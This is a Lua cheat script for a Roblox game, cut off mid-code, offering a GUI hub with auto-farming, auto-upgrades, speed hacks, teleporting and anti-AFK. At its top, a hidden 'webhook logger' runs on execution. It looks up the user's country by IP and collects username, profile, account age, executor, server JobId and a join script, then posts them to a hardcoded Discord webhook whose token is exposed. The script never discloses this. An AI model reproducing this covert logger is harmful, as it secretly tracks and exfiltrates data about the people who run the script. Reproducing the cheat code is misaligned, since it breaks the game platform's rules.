local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Stats = game:GetService("Stats")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local lp = Players.LocalPlayer

--// ================== WEBHOOK LOGGER ==================
local request = syn and syn.request or http_request or request or fluxus and fluxus.request or (http and http.request)
if request then
    local function GetExecutor()
        local name = "Unknown"
        pcall(function() if identifyexecutor then name = identifyexecutor() end end)
        return name
    end

    local function GetFPS()
        local fps = 60
        pcall(function() fps = math.floor(1 / RunService.RenderStepped:Wait()) end)
        return fps
    end

    local function GetPing()
        local ping = 0
        pcall(function() ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) end)
        return ping
    end

    local memory = math.floor(Stats:GetTotalMemoryUsageMb())

    local region = "Unknown"
    pcall(function()
        local r = request({Url="http://ip-api.com/json",Method="GET"})
        local data = HttpService:JSONDecode(r.Body)
        region = data.country
    end)

    local gameName = "Unknown"
    pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)

    local thumb = ""
    pcall(function()
        local res = request({Url="https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..lp.UserId.."&size=420x420&format=Png&isCircular=false",Method="GET"})
        local data = HttpService:JSONDecode(res.Body)
        thumb = data.data[1].imageUrl
    end)

    local flags = {}
    if getgenv().DEX_LOADED then table.insert(flags,"Dex") end
    if getgenv().rspy then table.insert(flags,"RemoteSpy") end
    if lp.AccountAge < 30 then table.insert(flags,"Alt Account") end
    if _G.__HUB_ALREADY_RAN then table.insert(flags,"Multi Inject") end
    _G.__HUB_ALREADY_RAN = true

    local flagText = (#flags>0 and table.concat(flags,", ")) or "None"
    local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d,"%s")', game.PlaceId, game.JobId)
    local unix = os.time()

    local embed = {
    ["embeds"] = {{
        ["title"] = "EXECUTION LOG",
        ["color"] = 0x00ff99,
        ["thumbnail"] = {["url"] = thumb},
        ["fields"] = {
            {name="👤 Player",value=lp.Name.." ("..lp.DisplayName..")",inline=true},
            {name="🔎 Profile",value="https://www.roblox.com/users/"..lp.UserId.."/profile",inline=true},
            {name="📊 Account Age",value=lp.AccountAge.." days",inline=true},
            {name="💻 Executor",value=GetExecutor(),inline=true},
            {name="⚡ Performance",value="FPS: "..GetFPS().." | Ping: "..GetPing().."ms",inline=true},
            {name="🧠 Memory",value=memory.." MB",inline=true},
            {name="🎮 Game",value=gameName,inline=true},
            {name="👥 Players",value=#Players:GetPlayers().."/"..Players.MaxPlayers,inline=true},
            {name="🌍 Country",value=region,inline=true},
            {name="🧩 PlaceId",value=tostring(game.PlaceId),inline=true},
            {name="📡 JobId",value=game.JobId,inline=true},
            {name="🚨 Flags",value=flagText,inline=true},
            {name="🔗 Join Script",value="```lua\n"..joinScript.."\n```",inline=false},
            {name="📅 Executed",value="<t:"..unix..":R>",inline=false},
        },
        ["footer"] = {["text"]="xdflex logger"}
    }}
    }

    request({
        Url = "https://discord.com/api/webhooks/1475079529377562645/wv_BURKvPsSF4kieeLvLQ2BiOuhZCC6SDxu-t4t-PCoG_4-4ORt2B1pws66r6RkiCkD6",
        Method = "POST",
        Headers = {["Content-Type"]="application/json"},
        Body = HttpService:JSONEncode(embed)
    })
end

--// ================== CONFIG SYSTEM ==================
local ConfigFile = "xdflex_config.json"
local DefaultConfig = {
    AutoUpgradeAll = false,
    AutoClaimPlaytime = false,
    AutoClaimPass = false,
    AutoRebirth = false,
    AutoBuySkin = false,
    AutoUpgradeSpeed = false,
    CustomBlockSpeedEnabled = false,
    CustomBlockSpeed = 1000,
    AutoFarmBrain = false,
    GodMode = false,
    AutoSellAll = false,
    AutoSellDelay = 2,
    WalkSpeedEnabled = false,
    WalkSpeed = 16,
    InfJump = false
}
local Config = {}

local function LoadConfig()
    if isfile and readfile and isfile(ConfigFile) then
        local success, data = pcall(function()
            return HttpService:JSONDecode(readfile(ConfigFile))
        end)
        if success and type(data) == "table" then
            for k, v in pairs(DefaultConfig) do
                if data[k] == nil then data[k] = v end
            end
            Config = data
            return
        end
    end
    Config = DefaultConfig
end

local function SaveConfig()
    if writefile then
        pcall(function()
            writefile(ConfigFile, HttpService:JSONEncode(Config))
        end)
    end
end

LoadConfig()

--// THEME SETTINGS
local Theme = {
    Background = Color3.fromRGB(15, 15, 20),
    Pattern = Color3.fromRGB(255, 255, 255),
    Card = Color3.fromRGB(22, 22, 30),
    CardHover = Color3.fromRGB(28, 28, 38),
    Accent = Color3.fromRGB(120, 80, 255), 
    Border = Color3.fromRGB(40, 40, 55),
    Text = Color3.fromRGB(245, 245, 255),
    TextDim = Color3.fromRGB(140, 140, 160),
    Success = Color3.fromRGB(80, 255, 120),
    Error = Color3.fromRGB(255, 80, 80)
}

local function Tween(obj, props, time, style)
    local t = TweenService:Create(obj, TweenInfo.new(time or 0.35, style or Enum.EasingStyle.Quint, Enum.EasingDirection.Out), props)
    t:Play()
    return t
end

--// ================== NOTIFICATION SYSTEM ==================
local NotifGui = Instance.new("ScreenGui", CoreGui)
NotifGui.Name = "xdflex_notif"
NotifGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

local NotifLayout = Instance.new("Frame", NotifGui)
NotifLayout.Size = UDim2.new(0, 300, 1, -50)
NotifLayout.Position = UDim2.new(1, -320, 0, 20)
NotifLayout.BackgroundTransparency = 1

local UIList = Instance.new("UIListLayout", NotifLayout)
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.VerticalAlignment = Enum.VerticalAlignment.Bottom
UIList.Padding = UDim.new(0, 10)

local function SendNotification(title, text, duration)
    local NotifCard = Instance.new("Frame", NotifLayout)
    NotifCard.Size = UDim2.new(1, 0, 0, 60)
    NotifCard.BackgroundColor3 = Theme.Card
    NotifCard.BackgroundTransparency = 1
    Instance.new("UICorner", NotifCard).CornerRadius = UDim.new(0, 8)
    
    local Stroke = Instance.new("UIStroke", NotifCard)
    Stroke.Color = Theme.Accent
    Stroke.Thickness = 1
    Stroke.Transparency = 1
    
    local T = Instance.new("TextLabel", NotifCard)
    T.Position = UDim2.new(0, 15, 0, 10)
    T.Size = UDim2.new(1, -30, 0, 20)
    T.BackgroundTransparency = 1
    T.Text = title
    T.Font = Enum.Font.GothamBold
    T.TextSize = 14
    T.TextColor3 = Theme.Text
    T.TextXAlignment = Enum.TextXAlignment.Left
    T.TextTransparency = 1

    local D = Instance.new("TextLabel", NotifCard)
    D.Position = UDim2.new(0, 15, 0, 32)
    D.Size = UDim2.new(1, -30, 0, 18)
    D.BackgroundTransparency = 1
    D.Text = text
    D.Font = Enum.Font.Gotham
    D.TextSize = 12
    D.TextColor3 = Theme.TextDim
    D.TextXAlignment = Enum.TextXAlignment.Left
    D.TextTransparency = 1

    Tween(NotifCard, {BackgroundTransparency = 0.1}, 0.5)
    Tween(Stroke, {Transparency = 0.5}, 0.5)
    Tween(T, {TextTransparency = 0}, 0.5)
    Tween(D, {TextTransparency = 0}, 0.5)
    
    task.delay(duration or 3, function()
        Tween(NotifCard, {BackgroundTransparency = 1}, 0.5)
        Tween(Stroke, {Transparency = 1}, 0.5)
        Tween(T, {TextTransparency = 1}, 0.5)
        local out = Tween(D, {TextTransparency = 1}, 0.5)
        out.Completed:Connect(function() NotifCard:Destroy() end)
    end)
end

--// ================== ANTI AFK ==================
local VirtualInputManager = game:GetService("VirtualInputManager")
task.spawn(function()
    while true do
        pcall(function()
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
            task.wait(0.06)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        end)
        task.wait(600)
    end
end)

--// ================== MAIN UI & DRAG LOGIC ==================
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "xdflex_hub"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

local Shadow = Instance.new("ImageLabel", ScreenGui)
Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
Shadow.Position = UDim2.fromScale(0.5, 0.5)
Shadow.Size = UDim2.fromOffset(590, 390)
Shadow.BackgroundTransparency = 1
Shadow.Image = "rbxassetid://4743306766"
Shadow.ImageColor3 = Color3.fromRGB(0,0,0)
Shadow.ImageTransparency = 0.4
Shadow.ScaleType = Enum.ScaleType.Slice
Shadow.SliceCenter = Rect.new(35, 35, 265, 265)

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.fromOffset(550, 350)
Main.Position = UDim2.fromScale(0.5, 0.5)
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.BackgroundColor3 = Theme.Background
Main.ClipsDescendants = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
Instance.new("UIStroke", Main).Color = Theme.Border

local Texture = Instance.new("ImageLabel", Main)
Texture.Size = UDim2.fromScale(1, 1)
Texture.BackgroundTransparency = 1
Texture.Image = "rbxassetid://6527264624"
Texture.ImageColor3 = Theme.Pattern
Texture.ImageTransparency = 0.95
Texture.ScaleType = Enum.ScaleType.Tile
Texture.TileSize = UDim2.fromOffset(64, 64)

local function MakeDraggable(dragObj, moveObj)
    local dragging, dragInput, dragStart, startPos
    dragObj.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = moveObj.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    dragObj.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            Tween(moveObj, {Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)}, 0.15)
        end
    end)
end

MakeDraggable(Main, Main)
Main:GetPropertyChangedSignal("Position"):Connect(function() Shadow.Position = Main.Position end)

--// MOBILE TOGGLE BUTTON
local Mini = Instance.new("TextButton", ScreenGui)
Mini.Size = UDim2.fromOffset(45, 45)
Mini.Position = UDim2.new(0.1, 0, 0.2, 0)
Mini.Text = "XZ"
Mini.Font = Enum.Font.GothamBlack
Mini.TextSize = 16
Mini.TextColor3 = Theme.Accent
Mini.BackgroundColor3 = Theme.Background
Instance.new("UICorner", Mini).CornerRadius = UDim.new(0, 12)
Instance.new("UIStroke", Mini).Color = Theme.Border
MakeDraggable(Mini, Mini)

Mini.MouseButton1Click:Connect(function()
    Main.Visible = not Main.Visible
    Shadow.Visible = Main.Visible
end)

UserInputService.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.LeftAlt then
        Main.Visible = not Main.Visible
        Shadow.Visible = Main.Visible
    end
end)

--// ================== SIDEBAR & PAGES ==================
local Sidebar = Instance.new("Frame", Main)
Sidebar.Size = UDim2.new(0, 140, 1, 0)
Sidebar.BackgroundColor3 = Theme.Card
Sidebar.BackgroundTransparency = 0.5
Sidebar.BorderSizePixel = 0
Instance.new("UICorner", Sidebar).CornerRadius = UDim.new(0, 12)

local Title = Instance.new("TextLabel", Sidebar)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundTransparency = 1
Title.Text = "XDFLEX"
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 18
Title.TextColor3 = Theme.Accent

local TabScroll = Instance.new("ScrollingFrame", Sidebar)
TabScroll.Position = UDim2.new(0, 0, 0, 60)
TabScroll.Size = UDim2.new(1, 0, 1, -60)
TabScroll.BackgroundTransparency = 1
TabScroll.ScrollBarThickness = 0
TabScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y

local TabLayout = Instance.new("UIListLayout", TabScroll)
TabLayout.Padding = UDim.new(0, 8)
TabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local Content = Instance.new("Frame", Main)
Content.Position = UDim2.new(0, 150, 0, 10)
Content.Size = UDim2.new(1, -160, 1, -20)
Content.BackgroundTransparency = 1

local Pages = {}

local function CreatePage(name)
    local Page = Instance.new("ScrollingFrame", Content)
    Page.Size = UDim2.fromScale(1, 1)
    Page.BackgroundTransparency = 1
    Page.Visible = false
    Page.AutomaticCanvasSize = Enum.AutomaticSize.Y
    Page.CanvasSize = UDim2.new(0, 0, 0, 0)
    Page.ScrollBarThickness = 2
    Page.ScrollBarImageColor3 = Theme.Accent
    Page.BorderSizePixel = 0
    
    local Layout = Instance.new("UIListLayout", Page)
    Layout.Padding = UDim.new(0, 10)
    Pages[name] = Page
    return Page
end

local function CreateTab(text, page)
    local Btn = Instance.new("TextButton", TabScroll)
    Btn.Size = UDim2.new(0.85, 0, 0, 32)
    Btn.Text = text
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 12
    Btn.TextColor3 = Theme.TextDim
    Btn.BackgroundColor3 = Theme.Card
    Btn.BackgroundTransparency = 1
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)
    
    local Indicator = Instance.new("Frame", Btn)
    Indicator.Size = UDim2.new(0, 3, 0.5, 0)
    Indicator.Position = UDim2.new(0, -5, 0.25, 0)
    Indicator.BackgroundColor3 = Theme.Accent
    Indicator.BackgroundTransparency = 1
    Instance.new("UICorner", Indicator).CornerRadius = UDim.new(1, 0)

    Btn.MouseButton1Click:Connect(function()
        for _, p in pairs(Pages) do p.Visible = false end
        page.Visible = true

        for _, b in pairs(TabScroll:GetChildren()) do
            if b:IsA("TextButton") then
                Tween(b, {TextColor3 = Theme.TextDim, BackgroundTransparency = 1}, 0.2)
                Tween(b:FindFirstChild("Frame"), {BackgroundTransparency = 1, Position = UDim2.new(0, -5, 0.25, 0)}, 0.2)
            end
        end
        Tween(Btn, {TextColor3 = Theme.Text, BackgroundTransparency = 0}, 0.2)
        Tween(Indicator, {BackgroundTransparency = 0, Position = UDim2.new(0, 4, 0.25, 0)}, 0.2)
    end)
end

--// ================== UI COMPONENTS LIBRARY ==================
local function CreateCard(parent, title, desc, height)
    local Card = Instance.new("Frame", parent)
    Card.Size = UDim2.new(1, -10, 0, height or 70)
    Card.Position = UDim2.new(0, 5, 0, 0)
    Card.BackgroundColor3 = Theme.Card
    Instance.new("UICorner", Card).CornerRadius = UDim.new(0, 8)
    local Stroke = Instance.new("UIStroke", Card)
    Stroke.Color = Theme.Border
    Stroke.Thickness = 1
    
    local T = Instance.new("TextLabel", Card)
    T.Position = UDim2.new(0, 15, 0, 12)
    T.Size = UDim2.new(0.6, 0, 0, 18)
    T.BackgroundTransparency = 1
    T.Text = title
    T.Font = Enum.Font.GothamBold
    T.TextSize = 13
    T.TextColor3 = Theme.Text
    T.TextXAlignment = Enum.TextXAlignment.Left

    local D = Instance.new("TextLabel", Card)
    D.Position = UDim2.new(0, 15, 0, 34)
    D.Size = UDim2.new(0.6, 0, 0, 16)
    D.BackgroundTransparency = 1
    D.Text = desc or ""
    D.Font = Enum.Font.Gotham
    D.TextSize = 11
    D.TextColor3 = Theme.TextDim
    D.TextXAlignment = Enum.TextXAlignment.Left

    Card.MouseEnter:Connect(function()
        Tween(Card, {BackgroundColor3 = Theme.CardHover}, 0.2)
        Tween(Stroke, {Color = Theme.Accent, Transparency = 0.5}, 0.2)
    end)
    Card.MouseLeave:Connect(function()
        Tween(Card, {BackgroundColor3 = Theme.Card}, 0.2)
        Tween(Stroke, {Color = Theme.Border, Transparency = 0}, 0.2)
    end)

    return Card
end

local function AddToggle(card, defaultState, callback)
    local ToggleBG = Instance.new("Frame", card)
    ToggleBG.Size = UDim2.fromOffset(42, 22)
    ToggleBG.Position = UDim2.new(1, -55, 0, 24) 
    ToggleBG.BackgroundColor3 = Theme.Background
    Instance.new("UICorner", ToggleBG).CornerRadius = UDim.new(1, 0)
    Instance.new("UIStroke", ToggleBG).Color = Theme.Border

    local ToggleKnob = Instance.new("Frame", ToggleBG)
    ToggleKnob.Size = UDim2.fromOffset(16, 16)
    ToggleKnob.Position = UDim2.new(0, 3, 0.5, -8)
    ToggleKnob.BackgroundColor3 = Theme.TextDim
    Instance.new("UICorner", ToggleKnob).CornerRadius = UDim.new(1, 0)

    local Btn = Instance.new("TextButton", ToggleBG)
    Btn.Size = UDim2.fromScale(1, 1)
    Btn.BackgroundTransparency = 1
    Btn.Text = ""

    local enabled = defaultState or false

    local function UpdateVisuals(animTime)
        if enabled then
            Tween(ToggleBG, {BackgroundColor3 = Theme.Accent}, animTime)
            Tween(ToggleKnob, {Position = UDim2.new(1, -19, 0.5, -8), BackgroundColor3 = Theme.Text}, animTime)
        else
            Tween(ToggleBG, {BackgroundColor3 = Theme.Background}, animTime)
            Tween(ToggleKnob, {Position = UDim2.new(0, 3, 0.5, -8), BackgroundColor3 = Theme.TextDim}, animTime)
        end
    end
    UpdateVisuals(0) -- Set instantly on UI load

    Btn.MouseButton1Click:Connect(function()
        enabled = not enabled
        UpdateVisuals(0.2)
        callback(enabled)
    end)

    if enabled then
        task.spawn(function() callback(enabled) end)
    end
end

local function AddButton(card, text, callback)
    local Btn = Instance.new("TextButton", card)
    Btn.Size = UDim2.fromOffset(90, 28)
    Btn.Position = UDim2.new(1, -105, 0, 21)
    Btn.Text = text
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 11
    Btn.TextColor3 = Theme.Text
    Btn.BackgroundColor3 = Theme.Background
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)
    Instance.new("UIStroke", Btn).Color = Theme.Border

    Btn.MouseButton1Click:Connect(function()
        Tween(Btn, {BackgroundColor3 = Theme.Accent}, 0.1)
        task.delay(0.1, function() Tween(Btn, {BackgroundColor3 = Theme.Background}, 0.2) end)
        callback()
    end)
    return Btn
end

local function AddSlider(card, min, max, default, callback)
    local SliderBG = Instance.new("Frame", card)
    SliderBG.Position = UDim2.new(0.05, 0, 1, -20)
    SliderBG.Size = UDim2.new(0.9, 0, 0, 6)
    SliderBG.BackgroundColor3 = Theme.Background
    Instance.new("UICorner", SliderBG).CornerRadius = UDim.new(1, 0)

    local Fill = Instance.new("Frame", SliderBG)
    Fill.Size = UDim2.new(0, 0, 1, 0)
    Fill.BackgroundColor3 = Theme.Accent
    Instance.new("UICorner", Fill).CornerRadius = UDim.new(1, 0)

    local Knob = Instance.new("Frame", SliderBG)
    Knob.Size = UDim2.fromOffset(14, 14)
    Knob.AnchorPoint = Vector2.new(0.5, 0.5)
    Knob.Position = UDim2.new(0, 0, 0.5, 0)
    Knob.BackgroundColor3 = Theme.Text
    Instance.new("UICorner", Knob).CornerRadius = UDim.new(1, 0)

    local ValueTxt = Instance.new("TextLabel", card)
    ValueTxt.Position = UDim2.new(1, -50, 0, 30)
    ValueTxt.Size = UDim2.fromOffset(40, 20)
    ValueTxt.BackgroundTransparency = 1
    ValueTxt.Text = tostring(default)
    ValueTxt.Font = Enum.Font.GothamBold
    ValueTxt.TextSize = 12
    ValueTxt.TextColor3 = Theme.Accent
    ValueTxt.TextXAlignment = Enum.TextXAlignment.Right

    local function updateSlider(percent)
        percent = math.clamp(percent, 0, 1)
        local val = math.floor(min + ((max - min) * percent))
        ValueTxt.Text = tostring(val)
        Tween(Fill, {Size = UDim2.new(percent, 0, 1, 0)}, 0.1)
        Tween(Knob, {Position = UDim2.new(percent, 0, 0.5, 0)}, 0.1)
        callback(val)
    end

    local dragging = false
    SliderBG.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local percent = (input.Position.X - SliderBG.AbsolutePosition.X) / SliderBG.AbsoluteSize.X
            updateSlider(percent)
        end
    end)
    
    updateSlider((default - min) / (max - min))
end

--// ================== INITIALIZE PAGES ==================
local PageMain = CreatePage("Main")
local PageUpgrade = CreatePage("Upgrade")
local PageBrainrots = CreatePage("Brainrots")
local PagePlayer = CreatePage("Player")
local PageMisc = CreatePage("Misc")

CreateTab("Main", PageMain)
CreateTab("Upgrade", PageUpgrade)
CreateTab("Brainrots", PageBrainrots)
CreateTab("Player", PagePlayer)
CreateTab("Misc", PageMisc)

for _, p in pairs(Pages) do p.Visible = false end
PageMain.Visible = true

-- =========================================================================
-- ================== LOGIC INTEGRATION FROM FLUENT SCRIPT ==================
-- =========================================================================

--// ================== MAIN TAB ==================
local AutoCollectCashCard = CreateCard(PageMain, "Auto Collect Cash", "oowowowowowowo")
local autoCollectCash = Config.AutoCollectCash or false

AddToggle(AutoCollectCashCard, autoCollectCash, function(state)
    Config.AutoCollectCash = state
    if SaveConfig then SaveConfig() end
    autoCollectCash = state
    
    if state then
        task.spawn(function()
            while autoCollectCash do
                pcall(function()
                    -- ดึงตัวละครและ HumanoidRootPart ของเรา
                    local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
                    if not hrp then return end
                    
                    local plotsFolder = workspace:FindFirstChild("Plots")
                    if not plotsFolder then return end
                    
                    -- ค้นหา Plot ที่เป็นของผู้เล่น
                    local myPlot
                    for i = 1, 5 do
                        local plot = plotsFolder:FindFirstChild(tostring(i))
                        if plot and plot:FindFirstChild(tostring(i)) then
                            local inner = plot[tostring(i)]
                            for _, v in pairs(inner:GetDescendants()) do
                                if v:IsA("BillboardGui") and string.find(v.Name, lp.Name) then
                                    myPlot = inner
                                    break
                                end
                            end
                        end
                        if myPlot then break end
                    end
                    
                    -- ถ้าเจอ Plot ของเราแล้ว ให้หา CollectionPad เพื่อจำลองการสัมผัส
                    if myPlot then
                        for _, v in pairs(myPlot:GetDescendants()) do
                            if v.Name == "CollectionPad" and v:IsA("BasePart") then
                                -- จำลองการแตะ (0 = เริ่มแตะ, 1 = เลิกแตะ)
                                firetouchinterest(hrp, v, 0)
                                task.wait(0.05)
                                firetouchinterest(hrp, v, 1)
                            end
                        end
                    end
                end)
                
                -- หน่วงเวลา 1 วินาทีก่อนวนลูปเก็บใหม่ (ปรับให้ไวขึ้นได้ถ้าต้องการ)
                task.wait(1)
            end
        end)
    end
end)

local AutoUpgradeAllCard = CreateCard(PageMain, "Auto Upgrade All Brainrot", "Upgrades all slot")
local autoUpgradeAll = Config.AutoUpgradeAll
AddToggle(AutoUpgradeAllCard, Config.AutoUpgradeAll, function(state)
    Config.AutoUpgradeAll = state
    SaveConfig()
    autoUpgradeAll = state
    if not state then return end
    task.spawn(function()
        local remoteFunction = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ContainerService"):WaitForChild("RF"):WaitForChild("UpgradeBrainrot")
        while autoUpgradeAll do
            for i = 1, 30 do
                if not autoUpgradeAll then break end
                pcall(function()
                    remoteFunction:InvokeServer(tostring(i))
                end)
                task.wait(0.1)
            end
            task.wait(1) -- กันสแปมหลังจบ 1 รอบ
        end
    end)
end)

local RebirthCard = CreateCard(PageMain, "Auto Rebirth", "Rebirths automatically when ready")
local autoRebirth = Config.AutoRebirth
AddToggle(RebirthCard, Config.AutoRebirth, function(state)
    Config.AutoRebirth = state
    SaveConfig()
    autoRebirth = state
    if not state then return end
    task.spawn(function()
        local rebirth = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("RebirthService"):WaitForChild("RF"):WaitForChild("Rebirth")
        while autoRebirth do
            pcall(function() rebirth:InvokeServer() end)
            task.wait(1)
        end
    end)
end)

local RedeemCard = CreateCard(PageMain, "Redeem All Codes", "Automatically redeem known codes")
AddButton(RedeemCard, "REDEEM", function()
    local codes = {"release"}
    local redeem = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("CodesService"):WaitForChild("RF"):WaitForChild("RedeemCode")
    for _, code in ipairs(codes) do
        pcall(function() redeem:InvokeServer(code) end)
        task.wait(0.5)
    end
    SendNotification("Codes Redeemed", "Successfully tried all codes!", 3)
end)


--// ================== UPGRADE TAB ==================

local function parseCash(text)
    local suffixMap = { K=1e3, M=1e6, B=1e9, T=1e12, Qa=1e15, Qi=1e18, Sx=1e21, Sp=1e24, Oc=1e27, No=1e30, Dc=1e33 }
    text = text:gsub("%$", ""):gsub(",", ""):gsub("%s+", "")
    local num = tonumber(text:match("[%d%.]+"))
    local suf = text:match("%a+")
    if not num then return 0 end
    if suf and suffixMap[suf] then return num * suffixMap[suf] end
    return num
end

local AutoBuyCard = CreateCard(PageUpgrade, "Auto Buy Best Luckyblock", "Buys the best skin you can afford")
local autoBuySkin = Config.AutoBuySkin
local skinsList = { "prestige_mogging_luckyblock", "mogging_luckyblock", "colossus _luckyblock", "inferno_luckyblock", "divine_luckyblock", "spirit_luckyblock", "cyborg_luckyblock", "void_luckyblock", "gliched_luckyblock", "lava_luckyblock", "freezy_luckyblock", "fairy_luckyblock" }
AddToggle(AutoBuyCard, Config.AutoBuySkin, function(state)
    Config.AutoBuySkin = state
    SaveConfig()
    autoBuySkin = state
    if not state then return end
    task.spawn(function()
        local buyService = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("SkinService"):WaitForChild("RF"):WaitForChild("BuySkin")
        while autoBuySkin do
            pcall(function()
                local gui = lp.PlayerGui:FindFirstChild("Windows")
                if gui then
                    local scrollingFrame = gui:FindFirstChild("PickaxeShop"):FindFirstChild("ShopContainer"):FindFirstChild("ScrollingFrame")
                    local cash = lp.leaderstats.Cash.Value
                    local bestSkin, bestPrice = nil, 0
                    for _, name in ipairs(skinsList) do
                        local item = scrollingFrame:FindFirstChild(name)
                        if item and item:FindFirstChild("Main") and item.Main:FindFirstChild("Buy") then
                            local buyButton = item.Main.Buy:FindFirstChild("BuyButton")
                            if buyButton and buyButton.Visible and buyButton:FindFirstChild("Cash") then
                                local price = parseCash(buyButton.Cash.Text)
                                if cash >= price and price > bestPrice then
                                    bestSkin = name
                                    bestPrice = price
                                end
                            end
                        end
                    end
                    if bestSkin then buyService:InvokeServer(bestSkin) end
                end
            end)
            task.wait(0.5)
        end
    end)
end)

local AutoSpeedUpCard = CreateCard(PageUpgrade, "Auto Upgrade Speed", "Automatically buys speed upgrades")
local autoUpgradeSpeed = Config.AutoUpgradeSpeed
AddToggle(AutoSpeedUpCard, Config.AutoUpgradeSpeed, function(state)
    Config.AutoUpgradeSpeed = state
    SaveConfig()
    autoUpgradeSpeed = state
    if not state then return end
    task.spawn(function()
        local upgradeService = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.7.0"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("UpgradesService"):WaitForChild("RF"):WaitForChild("Upgrade")
        while autoUpgradeSpeed do
            pcall(function() upgradeService:InvokeServer("MovementSpeed", 1) end)
            task.wait(1)
        end
    end)
end)

local CustomBlockSpeedCard = CreateCard(PageUpgrade, "Lucky Block Speed", "Modify your current running block speed", 120)
local enableCustomSpeed = Config.CustomBlockSpeedEnabled
local blockSpeedValue = Config.CustomBlockSpeed
local originalSpeed = nil
local currentModel = nil

local function getMyModel()
    local folder = workspace:FindFirstChild("RunningModels")
    if not folder then return nil end
    for _, model in ipairs(folder:GetChildren()) do
        if model:GetAttribute("OwnerId") == lp.UserId then return model end
    end
    return nil
end

AddToggle(CustomBlockSpeedCard, Config.CustomBlockSpeedEnabled, function(state)
    Config.CustomBlockSpeedEnabled = state
    SaveConfig()
    enableCustomSpeed = state
    if not enableCustomSpeed then
        local model = getMyModel()
        if model and originalSpeed ~= nil then model:SetAttribute("MovementSpeed", originalSpeed) end
        originalSpeed = nil
        currentModel = nil
    end
end)

AddSlider(CustomBlockSpeedCard, 25, 2000, Config.CustomBlockSpeed, function(val)
    blockSpeedValue = val
    Config.CustomBlockSpeed = val
    SaveConfig()
end)

task.spawn(function()
    while true do
        if enableCustomSpeed then
            local model = getMyModel()
            if model then
                if model ~= currentModel then
                    currentModel = model
                    originalSpeed = model:GetAttribute("MovementSpeed")
                end
                if originalSpeed == nil then originalSpeed = model:GetAttribute("MovementSpeed") end
                model:SetAttribute("MovementSpeed", blockSpeedValue)
            else
                currentModel = nil
            end
        end
        task.wait(0.2)
    end
end)

--// ================== BRAINROTS TAB ==================

local AutoFarmBrainCard = CreateCard(PageBrainrots, "Auto Farm Brainrots", "Teleports to best zones automatically")
local autoFarmBrain = Config.AutoFarmBrain
AddToggle(AutoFarmBrainCard, Config.AutoFarmBrain, function(state)
    Config.AutoFarmBrain = state
    SaveConfig()
    autoFarmBrain = state
    if not state then return end
    task.spawn(function()
        while autoFarmBrain do
            pcall(function()
                local character = lp.Character or lp.CharacterAdded:Wait()
                local root = character:WaitForChild("HumanoidRootPart")
                local humanoid = character:WaitForChild("Humanoid")
                local modelsFolder = workspace:WaitForChild("RunningModels")
                local target = workspace:WaitForChild("CollectZones"):WaitForChild("base14")
                
                root.CFrame = CFrame.new(705.7786, 38.8665, -2123.2419)
                task.wait(0.3)
